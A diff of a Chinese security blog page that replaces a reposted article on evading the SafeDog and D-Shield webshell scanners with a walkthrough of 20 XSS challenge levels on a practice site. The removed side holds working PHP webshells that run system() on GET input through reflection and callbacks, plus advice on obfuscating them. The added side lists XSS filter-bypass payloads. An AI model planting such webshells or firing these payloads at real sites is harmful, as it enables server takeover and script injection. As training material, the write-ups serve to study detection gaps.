@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="bypass," />
+  <meta name="keywords" content="bypass,xss," />
 
 
 
@@ -84,18 +84,24 @@
 
 
 
-<meta name="description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
-<meta name="keywords" content="bypass">
+<meta name="description" content="接着上一文过来，这一部分是第二个环境的做题记录。">
+<meta name="keywords" content="bypass,xss">
 <meta property="og:type" content="article">
-<meta property="og:title" content="过狗总结（转）">
-<meta property="og:url" content="http://sunu11.com/2016/11/05/5/index.html">
+<meta property="og:title" content="我与XSS的感情之路(2)">
+<meta property="og:url" content="http://sunu11.com/2017/07/23/13/index.html">
 <meta property="og:site_name" content="SuNu11&#39;Blog">
-<meta property="og:description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
+<meta property="og:description" content="接着上一文过来，这一部分是第二个环境的做题记录。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-03-21T05:43:38.000Z">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-13.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-14.png">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-15.png">
+<meta property="og:image" content="http://www.freebuf.com/sectool/108568.html">
+<meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-16.png">
+<meta property="og:updated_time" content="2017-08-28T14:02:47.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="过狗总结（转）">
-<meta name="twitter:description" content="xx狗静态查杀大致分析目前，传统的WAF软件主要通过定时或是由管理员手动对网站">
+<meta name="twitter:title" content="我与XSS的感情之路(2)">
+<meta name="twitter:description" content="接着上一文过来，这一部分是第二个环境的做题记录。">
+<meta name="twitter:image" content="http://ofum8yjv2.bkt.clouddn.com/q-13.png">
 
 
 
@@ -123,13 +129,13 @@
 
 
 
-  <link rel="canonical" href="http://sunu11.com/2016/11/05/5/"/>
+  <link rel="canonical" href="http://sunu11.com/2017/07/23/13/"/>
 
 
 
 
 
-  <title> 过狗总结（转） | SuNu11'Blog </title>
+  <title> 我与XSS的感情之路(2) | SuNu11'Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -270,7 +276,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2016/11/05/5/">
+  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2017/07/23/13/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="SuNu11">
@@ -294,7 +300,7 @@
             
             
               
-                过狗总结（转）
+                我与XSS的感情之路(2)
               
             
           </h1>
@@ -307,8 +313,8 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-11-05T13:31:28+08:00">
-                2016-11-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-23T11:43:55+08:00">
+                2017-07-23
               </time>
             
 
@@ -326,8 +332,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/shell/" itemprop="url" rel="index">
-                    <span itemprop="name">shell</span>
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
                   </a>
                 </span>
 
@@ -341,8 +347,8 @@
             
               <span class="post-comments-count">
                 <span class="post-meta-divider">|</span>
-                <a href="/2016/11/05/5/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/11/05/5/" itemprop="commentCount"></span>
+                <a href="/2017/07/23/13/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/07/23/13/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -368,9 +374,32 @@
       
 
       
-        <p> </p><h3>xx狗静态查杀大致分析</h3><p>目前，传统的WAF软件主要通过定时或是由管理员手动对网站<a id="more"></a>程序进行查杀的主动方式以及当请求者浏览该文件时由WAF软件被动的方式进行查杀。而查杀的原理主要是通过对目标文件的特征与网马规则库进行比对。这种查杀原理有它的局限性，攻击者可以利用脚本语言的特性对已被查杀出来的WebShell进行伪装成类似正常的页面程序从而避开WAF软件的查杀。</p><p>因为狗的查杀并没有相关资料或文档等。不过，我们仍然可以从狗的查杀中得到部分结论。<br></p><ul><li>利用正则表达式<br></li></ul><p>这种方法最大的好处就是简单。但是，正则表达式最大的缺点就是其只对关键危险函数进行检查。也就是说，我们将关键函数稍微通过某种方式变换一下，正则表达式无法查杀了。而且，这种方法的误报率也很高。所以，这种方法的查杀效果不是很理想。但是这种方法最大的好处就是简单，速度快。一般在查杀web目录下的图片等文件时使用此种方法。</p><li>利用PHP代码分析技术<br></li><p>这种方法最大的好处是解决了正则查杀误报率过高的问题。在这里，我们可以大致分析一下查杀引擎的工作原理：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对PHP文件做预处理，去除掉注释，空格，等没有用的东西</p><p>我们可以在php中写入以下内容</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/<em>system(“$_get[‘x’]”);
-</em>/</span><span class="hljs-meta">?&gt;</span></code></pre><p>使用和d盾查杀，发现没有查杀出一句话。原来查杀引擎在查杀的时候，会做类似于编译器的优化，去掉一些乱七八糟的东西。也许你会认为代码写在注释里，php的编译器也会做类似优化操作，将其去除。而且，代码在注释里也不可能运行的。所以你可能会认为的查杀方式很正确。既简单又高效，为下一步处理降低了负担。</p><p>但是其实是不正确的。查阅php manual，在PHP 5 &gt;= 5.1.0, PHP 7 中，php官方提供了一个函数<span style="font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 1em;">ReflectionClass::getDocComment。</span>简而言之，这个函数最主要的作用是获取php的注释。我们可以通过这个函数获取文档中注释，然后通过php的动态函数调用等xxxx各种方法去执行我们所获取到的代码。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对上一步预处理所得到的结果做词法分析。以下代码</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1">$a=<span class="hljs-string">“system(@$_get[‘x’])”</span></code></pre><p>和</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1">system(@$_get[<span class="hljs-string">‘x’</span>])</code></pre><p>我们分别去查杀这两个文件。结果显而易见，第一个没有办法去查杀，而第二个一定会被查杀。由此，我们可以得出结论，查杀引擎会对php文件做词法分析，然后只对相关函数调用等再做进一步查杀。而类似于字符串等这样变量，查杀引擎基本上会直接将其舍弃。不再做进一步分析。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对上一步结果进行语法分析</p><p>从这一步开始，查杀引擎开始对相关函数的调用进行语法分析。分析变量作用域，函数参数调用等。再与webshell特征库进行比对，用以确定是否为webshell文件。</p><p>在查杀引擎中，基本上会对if等条件控制条件直接跳过，直接分析里面的代码。例如下面的例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">false</span>)<br>  {<br>    system(<span class="hljs-string">‘@$_get[‘</span>x<span class="hljs-string">‘]’</span>);<br>}</code></pre><p>这段代码在php文件进行编译的时候，会对其进行分支优化。也就是说，这段代码因为if语句中为false，属于死码，永远不会运行，所以编译器会将其删除掉。但是换做查杀引擎，会直接查杀并报警。据我猜测，php的控制流程跳转那么多，如果查杀引擎也像编译器那样做分支结构的优化，势必会造成查杀效率的降低。所以没办法，只好不管分支结构，直接查杀。</p><h3>躲避查杀的方法</h3><p>上面大致介绍了两种查杀引擎的办法，虽然比较粗略，但是也给了我们躲避查杀的思路。那就是，想办法隐藏关键的特征码。</p><ul><li>利用php反射技术</li></ul><p>反射是在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p><p>也就是说，我们可以利用反射去加载system函数，通过反射去传参。因为在反射中，system这个特征码只不过是字符串，所以我们很容易对其进行加解密等操作去躲开查杀引擎的查杀。</p><p>过狗例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span>$func = <span class="hljs-keyword">new</span> ReflectionFunction(<span class="hljs-string">“system”</span>);<br><span class="hljs-keyword">echo</span> $func-&gt;invokeArgs(<span class="hljs-keyword">array</span>(<span class="hljs-string">“$_GET[c]”</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>这个安全狗查不到，但是d盾可以查到，而d盾查杀结果是可疑函数调用，基本上等于没查到。下面来一段d盾和都查不到的shell</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld</span> </span>{<p></p>
-<p>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sayHelloTo</span><span class="hljs-params">($name)</span> </span>{<br>      $last_line = system($name);<br>              <span class="hljs-keyword">return</span> $last_line;<br>  }<br>}<br>$a=$_GET[<span class="hljs-string">“a”</span>];<br>$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">‘HelloWorld’</span>, <span class="hljs-string">‘sayHelloTo’</span>);<br><span class="hljs-keyword">echo</span> $reflectionMethod-&gt;invoke(<span class="hljs-keyword">new</span> HelloWorld(), $a);<br><span class="hljs-meta">?&gt;</span><br></p></code></pre><p>利用反射类中函数的办法去执行危险函数</p><ul><li>利用php的callback方法<br></li></ul><p>自 PHP 5.4 起可用 <a href="http://php.net/manual/zh/language.types.callable.php" target="_blank" rel="external">callable</a>&nbsp;类型指定回调类型 callback。本文档基于同样理由使用 <a href="#language.types.callback">callback</a>&nbsp;类型信息。一些函数如 <a href="http://php.net/manual/zh/function.call-user-func.php" target="_blank" rel="external">call_user_func()</a>&nbsp;或 <a href="http://php.net/manual/zh/function.usort.php" target="_blank" rel="external">usort()</a>&nbsp;可以接受用户自定义的回调函数作为参数。回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。也就是说，callback也可以接受一个字符串变量，并将其作为函数去执行。下面是例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span>$cb= <span class="hljs-string">‘system’</span>;ob_start($cb);<span class="hljs-keyword">echo</span> $_GET[c];ob_end_flush();<span class="hljs-meta">?&gt;</span></code></pre><p>在php中回调函数有很多，打开php的官方手册，找到支持callback的函数，基本上都可以用来做过狗一句话</p><ul><li>特征码的变形隐藏<br></li></ul><p>在上面的例子中，我们已经成功的将函数调用转换为字符串类型，然后通过反射等方式去执行。但是我们还需要躲避正则匹配等查杀引擎，这里还需要对特征码变形。当然了，这里变形的操作就很多了，例如base64加密，gzip压缩，或者，也可以自己写一段加解密字符串的函数。这里就不详细介绍了。</p><p>过狗的例子有很多，这里只不过给出思路。php作为一门弱类型的语言，可扩展性，灵活性比java一类等语言强很多。但是过于灵活也会导致很多安全问题。在静态查杀中，很容易躲避查杀，造成漏报等问题。所以在安全狗的博客中，也讲了静态查杀不太靠谱，还是防御好黑客上传shell才是正道，使其没有上传webshell的机会。</p><p>初次写文章，有些地方可能会有技术上的问题，望大牛斧正批评。也望各路大神交流过狗思路，共同学习进步。</p><p>参考资料</p><p></p><ul><li><a href="http://blog.safedog.cn/?p=77" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://blog.safedog.cn/?p=77</a>&nbsp; &nbsp; &nbsp; 一种理想的网站木马防护思路探究<br></li><li><a href="http://php.net/manual/zh/language.types.callable.php" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://php.net/manual/zh/language.types.callable.php</a>&nbsp; &nbsp; &nbsp; &nbsp; phpcallback<br></li><li><a href="https://secure.php.net/manual/zh/reflectionfunction.invoke.php" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">https://secure.php.net/manual/zh/reflectionfunction.invoke.php</a>&nbsp;php &nbsp; 反射<br></li><li><a href="https://security.tencent.com/index.php/blog/msg/58" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/58</a>&nbsp;TSRC<br></li><li>挑战赛： PHP防御绕过挑战实录<br></li><li><a href="http://wrox.cn/article/100032494/" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://wrox.cn/article/100032494/</a>&nbsp;未知攻焉知防 — Webshell变形技术集锦<br></li></ul><p></p><p><font face="Times New Roman" size="2">文／烤土豆啦（简书作者）原文链接：<a href="http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。" target="_blank" rel="external">http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。</a></font></p><p><br></p><p><br></p><p></p>
+        <p>接着上一文过来，这一部分是第二个环境的做题记录。<a id="more"></a></p>
+<h2 id="平台2-xsqler-win"><a href="#平台2-xsqler-win" class="headerlink" title="平台2 xsqler.win"></a>平台2 <a href="http://sqler.win/xss/index.php" target="_blank" rel="external">xsqler.win</a></h2><p><strong><em>Stage#1: <a href="http://sqler.win/xss/level1.php?name=test" target="_blank" rel="external">http://sqler.win/xss/level1.php?name=test</a></em></strong><br>本关简单，使用svg\body\style \ iframe等标签均可过关。<br>payload: <code>http://sqler.win/xss/level1.php?name=test&lt;body/onload=alert(1)&gt;</code></p>
+<p><strong><em>Stage#2: <a href="http://sqler.win/xss/level2.php?keyword=test" target="_blank" rel="external">http://sqler.win/xss/level2.php?keyword=test</a></em></strong><br>本题与第一题差不多，只需要进行标签的闭合即可。<br>payload:<br><code>http://sqler.win/xss/level2.php?keyword=test&quot;&gt;&lt;body/onload=alert(1)&gt;</code></p>
+<p><strong><em>Stage#3：<a href="http://sqler.win/xss/level3.php?writing=wait" target="_blank" rel="external">http://sqler.win/xss/level3.php?writing=wait</a></em></strong><br>本题通过测试，可得知过滤了&lt;&gt;，且只能用’闭合标签。于是采用on事件型如onmouseover、onmouseout、onclick等进行绕过。Payload: <code>&#39;onmouseover=&#39;alert(1)</code></p>
+<p><strong><em>Stage#4: <a href="http://sqler.win/xss/level4.php?keyword=" target="_blank" rel="external">http://sqler.win/xss/level4.php?keyword=</a></em></strong><br>本题与上题类似，使用”闭合标签即可：payload：<code>&quot;onmouseover=&#39;alert(1)’</code></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-13.png" alt="图13"></p>
+<p><strong><em>Stage#5: <a href="http://sqler.win/xss/level5.php?keyword=find" target="_blank" rel="external">http://sqler.win/xss/level5.php?keyword=find</a> a way out! </em></strong><br>本题比较简单，增加了过滤范围，on-&gt;o_n 然后需要闭合。可以使用<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code>通过点击出现的链接进行通关。</p>
+<p><strong><em>Stage#6: <a href="http://sqler.win/xss/level6.php?keyword=break" target="_blank" rel="external">http://sqler.win/xss/level6.php?keyword=break</a> it out! </em></strong><br>随便哪一个试一下，处理掉了src、herf、onxxx、等，需要进行绕过，通过大小写，成功绕过payload：<code>&quot;&gt;&lt;a HRef=javascript:alert(1)&gt;</code></p>
+<p><strong><em>Stage#7: <a href="http://sqler.win/xss/level7.php?keyword=move" target="_blank" rel="external">http://sqler.win/xss/level7.php?keyword=move</a> up! </em></strong><br>本题对输入的script、on等进行了单层过滤，可以使用其过滤不严，采用此类payload绕过即可：<code>&lt;svg/oonnload=alert(1)&gt;、或者将script写成scrscriptipt</code>的方式构造即可。</p>
+<p><strong><em>Stage#8:<a href="http://sqler.win/xss/level7.php?keyword=move" target="_blank" rel="external">http://sqler.win/xss/level7.php?keyword=move</a> up! </em></strong><br>本题已经给出了一个<a>标签,但是过滤了script、src等，大小写无法绕过，但是可以使用html编码进行绕过payload：<code>javasc&amp;#114;ipt:alert(1)</code></a></p>
+<p><strong><em>Stage#9：<a href="http://sqler.win/xss/level9.php?keyword=not" target="_blank" rel="external">http://sqler.win/xss/level9.php?keyword=not</a> bad! </em></strong><br>本题最大的难点在于绕合法连接，发现只有带<code>http://</code>的url才能被认为是合法链接，另外由于“”也被过滤，其他规则与上一关相同，因此需要进行编码。于是构造payload： <code>javascr&amp;#105pt:alert(&amp;#34;http://x&amp;#34;)</code></p>
+<p><strong><em>Stage#10：<a href="http://sqler.win/xss/level10.php?keyword=well" target="_blank" rel="external">http://sqler.win/xss/level10.php?keyword=well</a> done! </em></strong><br>本题存在三个隐藏输入框，构造如下get请求，查看元素后，发现t_sort能被写入，如图：<br>get请求：<a href="http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333" target="_blank" rel="external">http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333</a></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-14.png" alt="图14"></p>
+<p>因此只需要在该参数处构造跨站脚本语句即可，使用<code>&quot;onmouseover=&#39;alert(1)&#39;</code>然后让输入框属性显示出来改hidden为text即可：payload如下：<br><code>http://sqler.win/xss/level10.php?t_sort=&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p>
+<p><strong><em>Stage#11：<a href="http://sqler.win/xss/level11.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level11.php?keyword=good</a> job! </em></strong><br>通过查看元素，发现t_ref的value是我们这个网页的referer值，抓包修改referer输入xss payload：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code>即可，本题不想多说什么，感觉referer一般存在xss的极少。</p>
+<p><strong><em>Stage#12：<a href="http://sqler.win/xss/level12.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level12.php?keyword=good</a> job! </em></strong><br>查看元素可看到t_ua参数的value是User-Agent值，和上一题一样，修改为xss payload即可：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p>
+<p><strong><em>Stage#13：<a href="http://sqler.win/xss/level13.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level13.php?keyword=good</a> job! </em></strong><br>此题思路同上，这次传参位置为cookie，payload：<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;；</code>感觉这三题是绕脑洞的样子，，，但是在测试过程中还真没发现过，，，，</p>
+<p><strong><em>Stage#14：<a href="http://sqler.win/xss/level14.php" target="_blank" rel="external">http://sqler.win/xss/level14.php</a></em></strong><br>本题可以在查看元素发现嵌入了一个iframe页面，访问该页面是查看图片EXIF信息的，通过看答案知道有EXIF在解析过程中，某些插件在解析时输出未处理可导致xss漏洞，因此食用exiftool工具，修改图片EXIF后，进行上传，然后解析过程中弹窗。学习了，，，， </p>
+<p><strong><em>Stage#15：<a href="http://sqler.win/xsschallenge/level15.php?src=1.jpg" target="_blank" rel="external">http://sqler.win/xsschallenge/level15.php?src=1.jpg</a></em></strong><br>本关说是利用src可包含前面页面上的xss漏洞，然后进行弹窗，怎么尝试都没弹出来，，，表示无奈。。。。。</p>
+<p><strong><em>Stage#16：<a href="http://sqler.win/xss/level16.php?keyword=" target="_blank" rel="external">http://sqler.win/xss/level16.php?keyword=</a></em></strong><br>本题终于回到常规绕的思路上了，，经过尝试，可以判断过滤了空格，/等符号，然后尝试绕过，很多姿势都不行，包括编码，进制，截断等然后发现换行符可以绕过：%0a、%0d，因此，payload：<br><code>http://sqler.win/xss/level16.php?keyword=&lt;svg%0aonload=alert(1)&gt;</code></p>
+<p><strong><em>Stage#17：<a href="http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b" target="_blank" rel="external">http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b</a></em></strong><br>本题比较简单，在arg02参数值中写入事件型payload即可触发，payload:<br><code>http://sqler.win/xss/level17.php? arg02=%20onmousedown=alert(1)</code></p>
+<p><strong><em>Stage#18：ttp://sqler.win/xss/level18.php?arg01=a&amp;arg02=b</em></strong><br>本题与上一题相似，但是arg02无法构造出空格，也就没办法写入输出语句，然后试了试arg01，果然换汤不换药，直接写入payload：<code>%20onmousedown=alert(1)</code></p>
+<p><strong><em>Stage#19：<a href="http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b" target="_blank" rel="external">http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b</a></em></strong><br>右键查看元素可以看到一个swf文件被调用，然后设想为flash xss，通过下载该文件，使用JPEXS进行分析，发现为actionscript 2.0，然后知道actionscript 2.0是有可以使用getURL来执行javascript下面以一个实例来剖析Flash XSS过程。有点拗口，，,然后对应本题，定位geturl函数：</p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-15.png" alt="图15"><br>可以看到在sIFR的内容中当getURL打开时，version是可以传入到loc4中的，因此定位contentIsLink函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">function contentIsLink()</div><div class="line">  &#123;</div><div class="line">     return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4);</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
+<p>然后可以根据contentIsLink函数构造出payload:<br><code>http://sqler.win/xss/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(1)%22%3E1%3C/a%3E</code></p>
+<p><strong><em>Stage#20：<a href="http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b" target="_blank" rel="external">http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b</a></em></strong><br>本题个人感觉比上一题容易做出来，，下载swf文件使用JPEXS进行分析后可以发现是zeroclipboard.swf，然后百度一发，<img src="http://www.freebuf.com/sectool/108568.html" alt="freebuf">第一个，粘贴即可payload：<br><code>http://sqler.win/xss/xsf04.swf?id=\%22))}catch(e){(alert)(/XSS/.source);}//&amp;width=500&amp;height=500</code><br><img src="http://ofum8yjv2.bkt.clouddn.com/q-16.png" alt="图16"></p>
 
       
     </div>
@@ -389,7 +418,7 @@
  
    <div class="">
    <p><span>
-   <br/><br/><b>本文出处：</b><a href="/2016/11/05/5/" title="过狗总结（转）">http://sunu11.com/2016/11/05/5/</a><br/><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的，但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
+   <br/><br/><b>本文出处：</b><a href="/2017/07/23/13/" title="我与XSS的感情之路(2)">http://sunu11.com/2017/07/23/13/</a><br/><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的，但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
    </span></p>
    </div>
  
@@ -421,6 +450,8 @@
           
             <a href="/tags/bypass/" rel="tag"># bypass</a>
           
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
         </div>
       
 
@@ -428,8 +459,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/10/30/3/" rel="next" title="OpenStack云计算平台初体验">
-                <i class="fa fa-chevron-left"></i> OpenStack云计算平台初体验
+              <a href="/2017/07/20/12/" rel="next" title="我与XSS的感情之路(1)">
+                <i class="fa fa-chevron-left"></i> 我与XSS的感情之路(1)
               </a>
             
           </div>
@@ -438,8 +469,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/11/05/4/" rel="prev" title="sqlmap总结（1）">
-                sqlmap总结（1） <i class="fa fa-chevron-right"></i>
+              <a href="/2017/08/28/14/" rel="prev" title="我与XSS的感情之路(3)">
+                我与XSS的感情之路(3) <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -466,8 +497,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/11/05/5/"
-           data-title="过狗总结（转）" data-url="http://sunu11.com/2016/11/05/5/">
+      <div class="ds-thread" data-thread-key="2017/07/23/13/"
+           data-title="我与XSS的感情之路(2)" data-url="http://sunu11.com/2017/07/23/13/">
       </div>
     
   </div>
@@ -619,7 +650,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">xx狗静态查杀大致分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">躲避查杀的方法</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#平台2-xsqler-win"><span class="nav-number">1.</span> <span class="nav-text">平台2 xsqler.win</span></a></li></ol></div>
             
 
           </div>
